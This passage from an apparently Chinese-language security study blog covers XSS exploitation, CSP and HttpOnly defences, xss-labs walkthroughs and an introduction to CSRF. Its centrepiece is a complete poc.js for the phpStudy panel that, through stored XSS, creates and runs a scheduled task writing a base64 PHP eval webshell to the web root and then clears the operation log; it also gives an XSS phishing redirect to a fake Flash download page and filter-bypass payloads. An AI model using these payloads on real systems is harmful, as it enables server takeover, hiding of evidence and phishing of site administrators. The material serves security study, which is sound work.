id=\"六、攻击利用-数据提交\">六、攻击利用-数据提交</h4>\n<p><strong>原理</strong></p>\n<ul>\n<li><strong>条件</strong>：熟悉后台业务功能数据包，利用 <code>JS</code> 写一个模拟提交</li>\n<li><strong>利用</strong>：凭证获取不到或有防护无法利用凭证进入时执行其他</li>\n<li>这里其实原理就是可以通过去写入一个 <code>xss</code> 访问地址的形式，让系统下载远程恶意 <code>js</code> 文件，然后写入恶意代码，比如 <code>WebShell</code></li>\n</ul>\n<p><strong>实战案例</strong></p>\n<ul>\n<li>\n<p>这里还是以小皮面板做演示，这个漏洞是通过白盒审计出来的</p>\n</li>\n<li>\n<p>首先小皮控制台有一个文件管理页面，泄露了网站文件夹的地址</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250826200129358.png\" alt=\"image-20250826200129358\"></p>\n</li>\n<li>\n<p>同时，他下面还有一个计划任务，那我们就可以尝试利用 <code>xss</code> 去让他加载一个远程文件：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// poc.js</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">exp</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    $.<span class=\"title function_\">ajax</span>(&#123;</span><br><span class=\"line\">        <span class=\"attr\">url</span>: <span class=\"string\">&#x27;/service/app/tasks.php?type=task_list&#x27;</span>,   <span class=\"comment\">//获取计划任务列表</span></span><br><span class=\"line\">        <span class=\"attr\">type</span>: <span class=\"string\">&#x27;GET&#x27;</span>,</span><br><span class=\"line\">        <span class=\"attr\">headers</span>:&#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;X-Requested-With&quot;</span>: <span class=\"string\">&quot;XMLHttpRequest&quot;</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"attr\">dataType</span>: <span class=\"string\">&#x27;json&#x27;</span>,</span><br><span class=\"line\">        <span class=\"attr\">success</span>: <span class=\"keyword\">function</span> (<span class=\"params\">data</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> id = data.<span class=\"property\">data</span>[<span class=\"number\">0</span>].<span class=\"property\">ID</span>;    <span class=\"comment\">//任务名称</span></span><br><span class=\"line\">            $.<span class=\"title function_\">ajax</span>(&#123;</span><br><span class=\"line\">                <span class=\"attr\">url</span>: <span class=\"string\">&#x27;/service/app/tasks.php?type=exec_task&#x27;</span>,     <span class=\"comment\">//执行计划任务</span></span><br><span class=\"line\">                <span class=\"attr\">type</span>: <span class=\"string\">&#x27;POST&#x27;</span>,</span><br><span class=\"line\">                <span class=\"attr\">headers</span>:&#123;</span><br><span class=\"line\">                    <span class=\"string\">&quot;X-Requested-With&quot;</span>: <span class=\"string\">&quot;XMLHttpRequest&quot;</span>,</span><br><span class=\"line\">                    <span class=\"string\">&quot;Content-Type&quot;</span>: <span class=\"string\">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span></span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                <span class=\"attr\">data</span>: &#123; <span class=\"attr\">tid</span>: id &#125;,</span><br><span class=\"line\">                <span class=\"attr\">dataType</span>: <span class=\"string\">&#x27;json&#x27;</span>,</span><br><span class=\"line\">                <span class=\"attr\">success</span>: <span class=\"keyword\">function</span> (<span class=\"params\">res</span>) &#123;</span><br><span class=\"line\">                    $.<span class=\"title function_\">ajax</span>(&#123;</span><br><span class=\"line\">                        <span class=\"attr\">url</span>: <span class=\"string\">&#x27;/service/app/log.php?type=clearlog&#x27;</span>,</span><br><span class=\"line\">                        <span class=\"attr\">type</span>: <span class=\"string\">&#x27;POST&#x27;</span>,</span><br><span class=\"line\">                        <span class=\"attr\">data</span>: &#123; <span class=\"attr\">type</span>: <span class=\"string\">&#x27;clearlog&#x27;</span> &#125;,</span><br><span class=\"line\">                        <span class=\"attr\">dataType</span>: <span class=\"string\">&#x27;json&#x27;</span>,</span><br><span class=\"line\">                        <span class=\"attr\">success</span>: <span class=\"keyword\">function</span> (<span class=\"params\">res2</span>) &#123;&#125;</span><br><span class=\"line\">                    &#125;);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">save</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> data = <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>();</span><br><span class=\"line\">    data.<span class=\"property\">task_id</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">    data.<span class=\"property\">title</span> = <span class=\"string\">&#x27;shell_title&#x27;</span>;</span><br><span class=\"line\">    data.<span class=\"property\">exec_cycle</span> = <span class=\"string\">&#x27;5&#x27;</span>;</span><br><span class=\"line\">    data.<span class=\"property\">week</span> = <span class=\"string\">&#x27;1&#x27;</span>;</span><br><span class=\"line\">    data.<span class=\"property\">day</span> = <span class=\"string\">&#x27;3&#x27;</span>;</span><br><span class=\"line\">    data.<span class=\"property\">hour</span> = <span class=\"string\">&#x27;1&#x27;</span>;</span><br><span class=\"line\">    data.<span class=\"property\">minute</span> = <span class=\"string\">&#x27;1&#x27;</span>;</span><br><span class=\"line\">    data.<span class=\"property\">shell</span> = <span class=\"string\">&#x27;echo &quot;PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs/Pg==&quot; | base64 -d &gt; C:/xp.cn/www/wwwroot/admin/localhost_80/wwwroot/shell.php&#x27;</span>;    <span class=\"comment\">//要执行的命令</span></span><br><span class=\"line\">    $.<span class=\"title function_\">ajax</span>(&#123;</span><br><span class=\"line\">        <span class=\"attr\">url</span>: <span class=\"string\">&#x27;/service/app/tasks.php?type=save_shell&#x27;</span>,</span><br><span class=\"line\">        <span class=\"attr\">type</span>: <span class=\"string\">&#x27;POST&#x27;</span>,</span><br><span class=\"line\">        <span class=\"attr\">headers</span>:&#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;X-Requested-With&quot;</span>: <span class=\"string\">&quot;XMLHttpRequest&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;Content-Type&quot;</span>: <span class=\"string\">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"attr\">data</span>: data,</span><br><span class=\"line\">        <span class=\"attr\">dataType</span>: <span class=\"string\">&#x27;json&#x27;</span>,</span><br><span class=\"line\">        <span class=\"attr\">success</span>: <span class=\"keyword\">function</span> (<span class=\"params\">res</span>) &#123;</span><br><span class=\"line\">            <span class=\"title function_\">exp</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">save</span>();</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>简单解释一下这个文件的作用，首先他有两个函数，<code>save()</code> 函数的作用是将 <code>1.php</code> 木马文件写入到目标路径下的命令通过 POST 提交到计划任务的接口；<code>poc()</code> 函数的作用拿到刚刚提交的数据，然后执行该计划任务创建后门文件，最后删除操作日志</p>\n</li>\n<li>\n<p>由此只要管理员登录到后台查看日志文件，就会创建一个后门文件</p>\n</li>\n<li>\n<p>现在我们本地搭建一个服务器，然后将 <code>poc.js</code> 文件放上去：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250826200239098-1756209760071-3.png\" alt=\"\"></p>\n</li>\n<li>\n<p>然后通过登录框提交我们的恶意 <code>xss</code> 语句</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250826200323069.png\" alt=\"image-20250826200323069\"></p>\n</li>\n<li>\n<p>访问后台页面，看看后门文件是否成功创建：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250826200453996.png\" alt=\"image-20250826200453996\"></p>\n</li>\n<li>\n<p>成功创建</p>\n</li>\n</ul>\n<h4 id=\"七、攻击利用-网页钓鱼\">七、攻击利用-网页钓鱼</h4>\n<p><strong>原理</strong></p>\n<ul>\n<li><strong>XSS 网页钓鱼</strong> 是 XSS 攻击的典型场景之一：攻击者利用 XSS 漏洞在目标网站（如银行、论坛、电商平台）的页面中注入虚假交互界面（如登录表单、验证码弹窗），诱骗用户输入敏感信息（账号、密码、验证码等），并通过恶意脚本将信息发送给攻击者。</li>\n<li>最常见的就是伪造一个官方网站，然后诱导别人通过 <code>xss</code> 跳转，然后下载连接改成自己的恶意程序，这个程序可以是正常的应用捆绑恶意代码，这就涉及到免杀的内容了</li>\n</ul>\n<p><strong>实战案例</strong></p>\n<ul>\n<li>\n<p>这里只演示到跳转伪造的官网，后面的操作之后再了解</p>\n</li>\n<li>\n<p>我们有一个伪造的 <code>flash</code> 网页，并且将下载连接指向 <code>https://www.baidu.com</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250826200906473.png\" alt=\"image-20250826200906473\"></p>\n</li>\n<li>\n<p>然后，我们在刚刚的贷款软件那里注入恶意 <code>js</code> 代码，指向这个网址 <code>&lt;script&gt;alert('当前flash版本过低，请跳转官网下载最新版flash!');location.href='http://flash.ccc:100'&lt;/script&gt;</code></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250826200929549.png\" alt=\"image-20250826200929549\"></p>\n</li>\n<li>\n<p>然后模拟管理员查看提现日志：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250826201000869.png\" alt=\"image-20250826201000869\"></p>\n</li>\n<li>\n<p>此时弹出对话框，点击跳转到我们的伪造网站，点击下载就会跳转到百度的官网</p>\n</li>\n</ul>\n<h4 id=\"八、CSP-与-HttpOnly\">八、CSP 与 HttpOnly</h4>\n<h5 id=\"1-CSP\">1.CSP</h5>\n<p><strong>原理</strong></p>\n<ul>\n<li>\n<p><code>CSP</code>，即 <code>Content Security Policy</code>（内容安全策略），它是一种 <strong>可信白名单机制</strong>，<strong>用来限制网站中是否可以包含某来源内容</strong>。该制度明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单，它的实现和执行全部由浏览器完成，开发者只需要提供配置。</p>\n</li>\n<li>\n<p>CSP 提供了专门的指令和配置方式去防止 XSS、数据注入的发生：</p>\n<ul>\n<li>\n<p>1.<strong>禁止加载外域代码（限制脚本、样式等资源来源）</strong>：防止复杂的攻击逻辑</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Content-Security-Policy</span>:</span><br><span class=\"line\">\tdefault-src &#x27;self&#x27;; # 所有资源默认仅允许同源加载</span><br><span class=\"line\">\tscript-src &#x27;self&#x27;;  # 脚本仅允许同源</span><br><span class=\"line\">\tstyle-src &#x27;self&#x27;;   # 样式仅允许同源</span><br><span class=\"line\">\timg-src &#x27;self&#x27; data:; # 图片允许同源和data协议（如base64）</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>2.<strong>禁止外域提交（限制表单/数据提交目标）</strong>：网站被攻击后，用户的数据不会泄漏到外域</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Content-Security-Policy</span>:</span><br><span class=\"line\">\tform-action &#x27;self&#x27; https://trusted-partner.com; # 仅允许提交到同源或者指定的可信域</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>3.<strong>禁止内联脚本执行（如 Github 严格策略）</strong>：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Content-Security-Policy</span>:</span><br><span class=\"line\">\tscript-src &#x27;self&#x27; https://cdn.github.com; # 仅允许同源和指定CDN的外部脚本</span><br><span class=\"line\">\tstyle-src &#x27;self&#x27; https://cdn.github.com; # 禁止内联样式</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>4.<strong>禁止未授权的脚本执行（新特性，如 Google Map 移动版）</strong>：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Content-Security-Policy</span>:</span><br><span class=\"line\">\trequire-trusted-types-for &#x27;script&#x27;; # 仅要求脚本执行必须使用可信类型</span><br><span class=\"line\">\ttrusted-types mapPolicy; # 仅允许名为mapPolicy的可信类型策略</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n<li>\n<p>大概就是这几种配置方式，合理使用上报可及时发现 <code>xss</code>，利于尽快解决修复问题</p>\n</li>\n<li>\n<p>需要注意的是，这个东西本身不是用来防御 <code>xss</code> 攻击的，只是他的特性能够去有效抵御 <code>xss</code> 攻击</p>\n</li>\n</ul>\n<p><strong>实战案例</strong></p>\n<ul>\n<li>\n<p>这里做个简单的演示，看他是如何防止 xss 攻击的，我们有这样一个代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 设置CSP只允许加载本地源图片：  </span></span><br><span class=\"line\"><span class=\"comment\">// header(&quot;Content-Security-Policy:img-src &#x27;self&#x27; &quot;);  </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">setcookie</span>(<span class=\"string\">&#x27;name&#x27;</span>, <span class=\"string\">&#x27;xiaodi&#x27;</span>);  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">setcookie</span>(<span class=\"string\">&#x27;pass&#x27;</span>, <span class=\"string\">&#x27;123456&#x27;</span>);  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span>  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 加载的是一张我随意百度的外部图片  </span></span><br><span class=\"line\">&lt;img src=<span class=\"string\">&quot;https://img1.baidu.com/it/u=1838809789,205932933&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=889&amp;h=500&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>这里设置了两个 <code>cookie</code>，并且注释掉了 csp 的声明</p>\n</li>\n<li>\n<p>接下来我们去访问这个文件</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827154101425.png\" alt=\"image-20250827154101425\"></p>\n</li>\n<li>\n<p>可以看到这里正常的加载了图片</p>\n</li>\n<li>\n<p>那么我们现在把注释取消，再来试一下</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827154211702.png\" alt=\"image-20250827154211702\"></p>\n</li>\n<li>\n<p>csp 的意思就是说只允许加载同源的图片，所以说外面的图片加载不了，但可以加载同一个网站的图片，这样的设置，也就避免了，xss 平台获取信息的方法，虽然反射型的 <code>xss</code> 仍然是有效的，但这种通常没什么危害，也没有什么意义</p>\n</li>\n</ul>\n<p><strong>绕过及判断</strong></p>\n<ul>\n<li>\n<p>本来 xss 就不好利用造成危害，更别提开这个了，遇到直接跑路</p>\n</li>\n<li>\n<p>因为 CSP 的 <strong>本质是在 HTTP 响应头中添加 <code>Content-Security-Policy</code> 字段</strong>，所以我们可以通过这个命令查看 Header 是否有这个字段即可：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; curl -i http://IP:Port/file</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>比如这里</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827154721953.png\" alt=\"image-20250827154721953\"></p>\n</li>\n</ul>\n<h5 id=\"2-HttpOnly\">2.HttpOnly</h5>\n<p><strong>原理</strong></p>\n<ul>\n<li>\n<p><code>HttpOnly</code> <strong>是 <code>Cookie</code> 的一个安全属性</strong>，由服务器通过 <code>Set-Cookie</code> 响应头设置，用于限制客户端脚本（如 <code>JavaScript</code>）对 <code>Cookie</code> 的访问。他的核心目的是防御 <code>XSS</code> 攻击对敏感 <code>Cookie</code> 的窃取。</p>\n</li>\n<li>\n<p>开启这个选项很简单，只需要使用如下代码即可：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// cookie名，cookie值，cookie失效时间，cookie有效路径，cookie有效域名，secure安全属性，httponly安全属性</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">setcookie</span>(<span class=\"string\">&#x27;name&#x27;</span>, <span class=\"string\">&#x27;xiaodi&#x27;</span>, <span class=\"title function_ invoke__\">time</span>() + <span class=\"number\">3600</span>, <span class=\"string\">&#x27;/xss&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"literal\">false</span>, <span class=\"literal\">true</span>);</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><strong>绕过和判断</strong></p>\n<ul>\n<li>也没有啥绕过的必要，都很鸡肋</li>\n<li>这个可以直接在网页上 F12 看应用程序里的 cookie，如果开启的话会打上对钩</li>\n</ul>\n<h4 id=\"九、XSS-Filter-及靶场演示\">九、XSS Filter 及靶场演示</h4>\n<p><strong>原理</strong></p>\n<ul>\n<li><code>XSS Filter</code>（跨站脚本过滤器）是一种用于 <strong>检测并拦截恶意 <code>XSS</code> 代码</strong> 的安全机制，主要用于防御跨站脚本攻击（XSS）。</li>\n<li>一般有三种方式：\n<ul>\n<li><strong>基于特征检测</strong>：使用 <strong>正则表达式</strong> 匹配关键词，比如检测恶意标签、函数或事件等等，就相当于黑名单过滤</li>\n<li><strong>基于异常检测</strong>：更高级的 <code>Fliter</code> 会基于用户输入的内容进行检测，如果出现异常行为就进行拦截</li>\n<li><strong>输出编码</strong>：这个就是一个 <strong>间接的防御方式</strong>，通过将输入的编码进行实体化，将输出的内容进行编码等等</li>\n</ul>\n</li>\n<li>其实就是类似于防火墙对流量的检测方式。</li>\n</ul>\n<p><strong>靶场演示</strong></p>\n<ul>\n<li>这里就简单演示几个</li>\n</ul>\n<p><strong>第二关</strong></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827160938922.png\" alt=\"image-20250827160938922\"></p>\n<ul>\n<li>\n<p>发现有回显，尝试插入 js 语句</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827161049495.png\" alt=\"image-20250827161049495\"></p>\n</li>\n<li>\n<p>并没有成功，这里的回显没有出现符号丢失的问题，大概率是被实体化了，这里 f12 查看一下（通常要编辑下 HTML）</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827161247461.png\" alt=\"image-20250827161247461\"></p>\n</li>\n<li>\n<p>确实被实体化了，那这个点就基本绕不过了，只能换一个地方了，我们看到下面这里输入框还有个点，编辑成 <code>HTML</code> 之后可以看到没有被实体化：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827161447874.png\" alt=\"image-20250827161447874\"></p>\n</li>\n<li>\n<p>那我们就可以从这里入手，因为它是在 <code>value</code> 属性里的，所以被解析成了字符串，我们可以像 <code>SQL</code> 注入那样去尝试闭合，<strong>这里虽然显示双引号，但是我们单双引号都要尝试（因为前端只显示双引号）</strong>，于是我们尝试去闭合</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827161514063.png\" alt=\"image-20250827161514063\"></p>\n</li>\n<li>\n<p>成功弹窗</p>\n</li>\n</ul>\n<p><strong>第三关</strong></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827161917560.png\" alt=\"image-20250827161917560\"></p>\n<ul>\n<li>\n<p>使用 <code>JS</code> 注入语句 <code>&lt;script&gt;alert(1);&lt;/script&gt;</code> 看看能不能弹窗，这里和上一关一样，能够正常显示，但是并不弹窗，所以是被实体化了，而且这里两个点都被实体化了，尝试输入单双引号闭合，发现都不行，但我们 <strong>除了标签能够利用之外，还有事件可以利用</strong></p>\n</li>\n<li>\n<p>常见的标签事件：<a href=\"https://www.jianshu.com/p/76e980cbf910\">XSS 常用标签及触发事件 - 简书</a></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827162229945.png\" alt=\"image-20250827162229945\"></p>\n</li>\n<li>\n<p>这里 <code>&lt;input&gt;</code> 标签是有一个 <code>onfocus</code>、<code>click</code> 等事件可以利用的，那我们就直接构造一个事件出来，先使用单引号闭合，然后后面插入 <code>' onfocus='alert(1);'</code></p>\n</li>\n<li>\n<p>成功弹窗</p>\n</li>\n<li>\n<p>这里是成功利用了，这里为什么单引号不会被实体化呢？<strong>这是 <code>htmlspecialchars()</code> 函数的特性，转义哪些字符是根据其 <code>flag</code> 参数所定的，而默认呢是不实体化单引号的，在这里我们看源码他刚好是通过单引号包裹的，所以才能够侥幸绕过</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 源代码</span></span><br><span class=\"line\">&lt;input name=keyword  value=<span class=\"string\">&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><strong>第五关</strong></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827162655138.png\" alt=\"image-20250827162655138\"></p>\n<ul>\n<li>\n<p>仍然首先尝试闭合后注入普通 <code>JS</code> 语句，这里没有弹窗：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827162720259.png\" alt=\"image-20250827162720259\"></p>\n</li>\n<li>\n<p>这里可以看到首先是成功闭合了，说明是双引号，并且没有实体化，但是这里有点看不懂，我们再尝试用单引号闭合看看他的过滤方式</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827162743934.png\" alt=\"image-20250827162743934\"></p>\n</li>\n<li>\n<p>这里就可以很明显的看到他将 <code>script</code> 转成了 <code>scr_ipt</code>，让标签失效了，那我们可以先尝试 <strong>大小写绕过</strong>，这里是不行的，还是显示上面的结果，说明他在处理前转过小写</p>\n</li>\n<li>\n<p>那我们就先看看事件能不能用，先单引号闭合看看 <code>' onfocus='alert(1);'</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827162901291.png\" alt=\"image-20250827162901291\"></p>\n</li>\n<li>\n<p>这里 <code>on</code> 也被转换了，换一个属性试试呢，不行，这里 <code>&lt;input&gt;</code> 标签可用属性中都含有 <code>on</code></p>\n</li>\n<li>\n<p>再换种思路，这里既然能够闭合，那我们使用其他标签可不可以呢？看了看刚刚的那篇文章，发现有两个标签满足条件 <code>&lt;a&gt;</code> 和 <code>&lt;iframe&gt;</code>：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1：</span><br><span class=\"line\">&quot;&gt;<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;javascript:alert(&#x27;xss&#x27;);&quot;</span>&gt;</span>xss<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload2：</span><br><span class=\"line\">&quot;&gt;<span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">src</span>=<span class=\"string\">javascript:alert(</span>&#x27;<span class=\"attr\">xss</span>&#x27;)&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>之后的参考文章：<a href=\"https://blog.csdn.net/l2872253606/article/details/125638898\">xss-labs 靶场实战全通关详细过程（xss 靶场详解）-CSDN 博客</a></p>\n</li>\n</ul>\n<h4 id=\"十、黑盒-XSS-手工分析\">十、黑盒 XSS 手工分析</h4>\n<ul>\n<li>页面中显示的数据找可控的（有些隐藏的）</li>\n<li>利用可控地方发送 <code>JS</code> 代码去看执行加载情况</li>\n<li>成功执行即 <code>XSS</code>，不能成功执行就 <code>F12</code> 看语句输出的地方显示情况（过滤）</li>\n<li>根据显示分析为什么不能执行，尝试绕过（实体化、闭合、关键词过滤等）</li>\n</ul>\n<h3 id=\"CSRF-跨站请求伪造\">CSRF 跨站请求伪造</h3>\n<h4 id=\"一、基础知识-2\">一、基础知识</h4>\n<ul>\n<li>\n<p>CSRF（<code>Cross-Site Request Forgery</code>），也叫跨站请求伪造，是一种网络攻击手段，攻击者通过诱导用户在 <strong>已认证的状态下</strong> 访问恶意链接或页面，迫使用户的浏览器向目标服务器发送非预期的请求，从而执行攻击者预设的操作（如转账、修改密码、发表评论等）。</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250827211522661.png\" alt=\"image-20250827211522661\"></p>\n</li>\n<li>\n<p>其实很好理解，就像上面那张图一样，假设我现在抓到了支付宝的转账数据包如下：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.alipay.com/pay.php?name=ling&amp;account=12732834&amp;money=10000</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>然后我们搭建一个网站，让这个网站去直接加载这个数据包自动跳转，最后把这个网站的网址发给受害者</p>\n</li>\n<li>\n<p>如果这时受害者正处于支付宝的登录的状态下，那么他就会自动进行这个转账</p>\n</li>\n<li>\n<p>这就是典型的 <code>CSRF</code> 攻击</p>\n</li>\n</ul>\n<p><strong>利用条件</strong></p>\n<ul>\n<li>从上面可以看到，CSRF 的利用条件呢有三点：\n<ul>\n<li>需要请求伪造的数据包（可以通过 cms 之类的自己搭建并抓包想要利用别人的权限进行的操作）</li>\n<li>网站没有过滤防护或者有防护但可以绕过</li>\n<li>受害者要已经成功登录状态或者打开网站，而且要点击我们的恶意网站</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"二、无检测实战利用\">二、无检测实战利用</h4>\n<p><strong>利用</strong></p>\n<ul>\n<li>无检测防护就是说 <strong>开发者默认信任用户的所有操作</strong>，因此没有加一些 